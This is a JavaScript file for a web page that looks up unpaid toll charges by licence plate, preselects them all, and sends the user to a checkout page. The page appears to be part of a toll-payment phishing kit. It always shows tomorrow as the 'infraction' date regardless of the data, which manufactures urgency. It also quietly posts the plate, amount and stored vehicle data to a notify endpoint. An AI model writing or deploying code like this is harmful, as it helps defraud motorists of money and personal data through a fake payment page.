(function(){
  var params = new URLSearchParams(location.search);
  var plate = (params.get('plate') || '').toUpperCase().replace(/[^A-Z0-9]/g, '');
  var plateFormatted = plate.length >= 7 ? plate.substring(0, 3) + '-' + plate.substring(3) : plate;
  var selectedDebits = [];
  var latestDebits = [];

  var loadingPlateEl = document.getElementById('loadingPlate');
  if (loadingPlateEl && plateFormatted) loadingPlateEl.textContent = plateFormatted;

  function formatMoney(value){
    var number = Number(value) || 0;
    return 'R$ ' + number.toFixed(2).replace('.', ',');
  }

  function escapeHtml(value){
    return String(value || '')
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }

  function formatDate(date){
    if (!(date instanceof Date) || isNaN(date.getTime())) return '';
    var dd = String(date.getDate()).padStart(2, '0');
    var mm = String(date.getMonth() + 1).padStart(2, '0');
    var yyyy = date.getFullYear();
    return dd + '/' + mm + '/' + yyyy;
  }

  function parseDateTime(value){
    if (!value) return null;
    var stringValue = String(value).trim();
    var brMatch = stringValue.match(/^(\d{2})\/(\d{2})\/(\d{4})(?:\s+(\d{2}):(\d{2})(?::(\d{2}))?)?$/);
    if (brMatch) {
      return new Date(
        Number(brMatch[3]),
        Number(brMatch[2]) - 1,
        Number(brMatch[1]),
        Number(brMatch[4] || 0),
        Number(brMatch[5] || 0),
        Number(brMatch[6] || 0)
      );
    }
    var parsed = new Date(stringValue);
    return isNaN(parsed.getTime()) ? null : parsed;
  }

  function getExpiredLabel(item){
    var baseDate = parseDateTime(item.dataHora);
    if (!baseDate) return 'Passagem em aberto';
    var dueDate = new Date(baseDate.getTime());
    dueDate.setDate(dueDate.getDate() + 30);
    return 'Venceu em ' + formatDate(dueDate);
  }

  function hideLoading(){
    var overlay = document.getElementById('loadingOverlay');
    if(!overlay) return;
    overlay.style.opacity = '0';
    overlay.style.transition = 'opacity 0.35s';
    setTimeout(function(){ overlay.style.display = 'none'; }, 350);
  }

  function showMain(){
    var mainContent = document.getElementById('mainContent');
    if(mainContent) mainContent.style.display = 'block';
  }

  function setCheckedAt(){
    var now = new Date();
    var dd = String(now.getDate()).padStart(2, '0');
    var mm = String(now.getMonth() + 1).padStart(2, '0');
    var yyyy = now.getFullYear();
    var hh = String(now.getHours()).padStart(2, '0');
    var mi = String(now.getMinutes()).padStart(2, '0');
    var checkedAtEl = document.getElementById('debitoCheckedAt');
    if (checkedAtEl) checkedAtEl.innerHTML = 'Atualizado em: <strong>' + dd + '/' + mm + '/' + yyyy + ' - ' + hh + ':' + mi + '</strong>';
  }

  function setVehicleField(){
    var input = document.getElementById('qPlaca');
    if (!input) return;
    input.value = plateFormatted || plate;
  }

  function setInfractionDate(){
    var tomorrow = new Date(Date.now() + 86400000);
    var td = String(tomorrow.getDate()).padStart(2, '0');
    var tm = String(tomorrow.getMonth() + 1).padStart(2, '0');
    var ty = tomorrow.getFullYear();
    var dataInfracaoEl = document.getElementById('dataInfracao');
    if (dataInfracaoEl) dataInfracaoEl.textContent = td + '/' + tm + '/' + ty;
  }

  function syncBulkLabel(){
    var label = document.getElementById('bulkLabel');
    if (!label) return;
    if (!latestDebits.length) {
      label.textContent = 'Nenhuma passagem em aberto';
      return;
    }
    label.textContent = latestDebits.length === 1
      ? 'Selecionar 1 passagem em aberto'
      : 'Selecionar ' + latestDebits.length + ' passagens em aberto';
  }

  function updateTotal(){
    selectedDebits = latestDebits.filter(function(item){ return !!item.selected; });
    var total = selectedDebits.reduce(function(sum, item){ return sum + (Number(item.valor) || 0); }, 0);
    total = Math.round(total * 100) / 100;

    var totalValueEl = document.getElementById('totalValue');
    var modalValorEl = document.getElementById('modalValor');
    if (totalValueEl) totalValueEl.textContent = formatMoney(total);
    if (modalValorEl) modalValorEl.textContent = formatMoney(total);

    sessionStorage.setItem('debitoTotal', String(total));
    sessionStorage.setItem('selectedDebits', JSON.stringify(selectedDebits));

    var btnContinuar = document.getElementById('btnContinuar');
    if (btnContinuar) {
      btnContinuar.disabled = total <= 0;
      btnContinuar.style.opacity = total <= 0 ? '0.55' : '1';
      btnContinuar.style.cursor = total <= 0 ? 'not-allowed' : 'pointer';
    }

    var bulk = document.getElementById('checkAll');
    if (bulk) bulk.checked = latestDebits.length > 0 && selectedDebits.length === latestDebits.length;
  }

  function renderEmptyState(message){
    var lista = document.getElementById('listaDebitos');
    if (!lista) return;

    latestDebits = [];
    syncBulkLabel();
    lista.innerHTML = ''
      + '<li class="item">'
      +   '<div class="row" style="grid-template-columns:1fr">'
      +     '<div class="item-main">'
      +       '<div class="item-plate">Nenhum débito encontrado</div>'
      +       '<div class="item-meta">'
      +         '<span>' + escapeHtml(message || 'Não existem passagens pendentes para esta placa no momento.') + '</span>'
      +       '</div>'
      +     '</div>'
      +   '</div>'
      + '</li>';
    updateTotal();
  }

  function showError(message){
    showMain();
    hideLoading();
    renderEmptyState(message || 'Não foi possível consultar os débitos. Tente novamente em instantes.');
  }

  function renderDebits(debitos){
    var lista = document.getElementById('listaDebitos');
    if (!lista) return;

    latestDebits = debitos.map(function(item){
      return Object.assign({}, item, { selected: true });
    });

    syncBulkLabel();

    if (!latestDebits.length) {
      renderEmptyState('Se a placa estiver correta, tente consultar novamente em alguns minutos.');
      return;
    }

    lista.innerHTML = latestDebits.map(function(item, index){
      var vehicleLine = escapeHtml(item.plate || plateFormatted || plate);
      var dateLine = escapeHtml(item.dataHora || 'Data não informada');
      var concessionLine = escapeHtml(item.concessionaria || 'Concessionária não informada');
      var idLine = escapeHtml(item.id || ('debito_' + (index + 1)));
      var feeLine = 'Multa + Juros: R$ 0,00 + R$ 0,00';
      var totalLine = formatMoney(item.valor).replace('R$ ', '');

      return ''
        + '<li class="item">'
        +   '<label class="row">'
        +     '<input type="checkbox" class="debito-checkbox" data-index="' + index + '" checked>'
        +     '<div class="item-main">'
        +       '<div class="item-plate">' + vehicleLine + '</div>'
        +       '<div class="item-meta">'
        +         '<span>' + dateLine + '</span>'
        +         '<span>' + concessionLine + '</span>'
        +         '<span>' + idLine + '</span>'
        +       '</div>'
        +     '</div>'
        +     '<div class="item-side">'
        +       '<span class="badge-expired">' + escapeHtml(getExpiredLabel(item)) + '</span>'
        +       '<span class="item-price">' + formatMoney(item.valor) + '</span>'
        +       '<span class="row__fee">' + feeLine + '</span>'
        +       '<span class="row__total">Total: <strong>' + totalLine + '</strong></span>'
        +     '</div>'
        +   '</label>'
        + '</li>';
    }).join('');

    updateTotal();
  }

  function setupCheckboxes(){
    var lista = document.getElementById('listaDebitos');
    var bulk = document.getElementById('checkAll');

    if (lista) {
      lista.addEventListener('change', function(e){
        if (!e.target.classList.contains('debito-checkbox')) return;
        var index = Number(e.target.getAttribute('data-index'));
        if (!isNaN(index) && latestDebits[index]) {
          latestDebits[index].selected = !!e.target.checked;
          updateTotal();
        }
      });
    }

    if (bulk) {
      bulk.addEventListener('change', function(){
        var checked = !!this.checked;
        latestDebits.forEach(function(item){ item.selected = checked; });
        document.querySelectorAll('.debito-checkbox').forEach(function(cb){ cb.checked = checked; });
        updateTotal();
      });
    }
  }

  function setupButtons(){
    var btnContinuar = document.getElementById('btnContinuar');
    if (btnContinuar) {
      btnContinuar.onclick = function(){
        var total = selectedDebits.reduce(function(sum, item){ return sum + (Number(item.valor) || 0); }, 0);
        total = Math.round(total * 100) / 100;
        if (total <= 0) return;

        document.getElementById('atencaoModal').classList.add('is-open');
        document.getElementById('btnEntendi').setAttribute('data-checkout-url', 'checkout.html?plate=' + encodeURIComponent(plateFormatted) + '&amount=' + total.toFixed(2));
      };
    }

    function closeModal(){ document.getElementById('atencaoModal').classList.remove('is-open'); }
    function goBack(){ closeModal(); location.href = 'pedagio.html'; }

    var btnCancelar = document.getElementById('btnCancelar');
    var btnEntendi = document.getElementById('btnEntendi');
    var modalOverlay = document.getElementById('modalOverlay');

    if (btnCancelar) btnCancelar.onclick = goBack;
    if (btnEntendi) btnEntendi.onclick = function(){
      var url = this.getAttribute('data-checkout-url');
      if (url) location.href = url;
      else closeModal();
    };
    if (modalOverlay) modalOverlay.onclick = closeModal;
  }

  function notifyPlateSearch(total){
    var vehicleData = JSON.parse(sessionStorage.getItem('vehicleData') || '{}');
    fetch('/api/notify/plate-search', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(Object.assign({ plate: plateFormatted, amount: total }, vehicleData))
    }).catch(function(){});
  }

  function initPage(data){
    setVehicleField();
    setCheckedAt();
    setInfractionDate();
    renderDebits(data.debitos || []);
    notifyPlateSearch(data.total || 0);
    showMain();
    hideLoading();
  }

  function loadDebits(){
    if (!plate) {
      showError('A placa informada é inválida. Volte e digite novamente.');
      return;
    }

    fetch('/api/plate-debts?plate=' + encodeURIComponent(plate))
      .then(function(response){ return response.json(); })
      .then(function(data){
        if (!data || data.success === false) {
          throw new Error((data && data.error) || 'Não foi possível consultar os débitos da placa.');
        }
        initPage(data);
      })
      .catch(function(error){
        console.error('Erro ao consultar débitos:', error);
        showError(error.message || 'Falha ao buscar os débitos da placa.');
      });
  }

  setupCheckboxes();
  setupButtons();
  loadDebits();
})();
